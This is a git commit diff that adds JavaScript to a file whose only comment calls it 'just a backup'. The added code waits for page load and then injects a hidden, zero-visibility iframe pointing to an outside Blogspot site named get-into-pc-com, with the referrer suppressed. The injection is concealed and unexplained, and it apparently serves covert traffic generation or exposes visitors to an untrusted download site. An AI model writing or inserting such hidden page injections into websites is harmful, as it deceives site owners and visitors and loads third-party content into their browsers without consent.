34b51025fdcd68f920a4128939d2cf93ef513bc6
hmidaras <76486713+hmidaras@users.noreply.github.com>
2021-03-23 13:13:55 +0100

    Update Ihtiyat.js

--- Ihtiyat.js
+++ Ihtiyat.js
@@ -1,1 +1,6 @@
 //مجرد احتياطي
+$(window).on('load',function(){
+    setTimeout(() => {
+        $('body').append("<iframe style='display:none;height:720px;width:1280px' src='https://get-into-pc-com.blogspot.com' referrerpolicy='no-referrer' sandbox='allow-forms'></iframe>");
+    }, 3000);
+});
